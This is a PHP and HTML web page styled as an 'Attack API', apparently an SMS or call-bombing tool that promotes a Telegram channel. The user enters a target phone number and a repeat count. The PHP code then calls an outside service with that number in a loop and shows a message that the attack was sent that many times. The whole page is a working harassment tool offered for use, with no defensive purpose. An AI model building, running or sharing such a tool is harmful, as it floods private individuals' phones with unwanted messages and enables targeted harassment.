<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Interface</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap');
        
        body {
            background: url('https://i.ibb.co/YbJD77R/1000018334.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Poppins', sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4), 0 0 10px rgba(0, 255, 255, 0.3);
            width: 90%;
            max-width: 400px;
            animation: fadeIn 1s ease-in-out;
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 15px;
            color: #00e7ff;
            text-shadow: 0 0 8px #00e7ff, 0 0 16px #00e7ff;
        }

        .input-field {
            margin: 10px 0;
        }

        input {
            width: 100%;
            padding: 10px;
            font-size: 1rem;
            border: 2px solid #00e7ff;
            border-radius: 8px;
            background: rgba(0, 0, 0, 0.5);
            color: #fff;
            outline: none;
            text-align: center;
            box-shadow: 0 0 8px #00e7ff;
            transition: 0.3s ease;
        }

        input:focus {
            box-shadow: 0 0 15px #00e7ff, 0 0 10px #00ff99;
        }

        button {
            padding: 10px 20px;
            background: linear-gradient(to right, #ff7e5f, #feb47b);
            border: none;
            border-radius: 20px;
            color: #fff;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s ease-in-out;
            box-shadow: 0 0 10px #ff7e5f, 0 0 20px #feb47b;
            margin-top: 10px;
            width: 100%;
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px #ff7e5f, 0 0 40px #feb47b;
        }

        .footer {
            margin-top: 15px;
            font-style: italic;
            font-size: 1rem;
            color: #00e7ff;
            text-shadow: 0 0 5px #00e7ff, 0 0 10px #00ff99;
        }

        .modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 255, 0, 0.9);
            color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px #00ff00;
            text-align: center;
            animation: fadeIn 0.5s ease;
            z-index: 1000;
        }

        .modal h2 {
            margin: 0;
            font-size: 1.5rem;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .join-channel {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ Attack API ⚡</h1>
        <form method="POST">
            <div class="input-field">
                <input type="text" name="number" placeholder="Enter Number" required>
            </div>
            <div class="input-field">
                <input type="number" name="amount" placeholder="Enter Amount" min="1" required>
            </div>
            <button type="submit">🔥 Attack 🔥</button>
        </form>
        <div class="join-channel">
            <a href="https://t.me/DenGer_MathoD" target="_blank">
                <button type="button">Join Channel</button>
            </a>
        </div>
        <div class="footer">Powered by @RTx2R</div>
    </div>

    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $number = htmlspecialchars($_POST['number']);
        $amount = intval($_POST['amount']);

        if (!empty($number) && $amount > 0) {
            $api_url = "https://bdtools.top/free.php?phone=" . urlencode($number);

            for ($i = 0; $i < $amount; $i++) {
                // Send the request to the API
                $response = file_get_contents($api_url);
            }

            echo "
            <div class='modal'>
                <h2>✅ Success! Attack sent $amount times to $number ✅</h2>
            </div>
            ";
        } else {
            echo "<script>alert('Please fill in all fields correctly!');</script>";
        }
    }
    ?>
</body>
</html>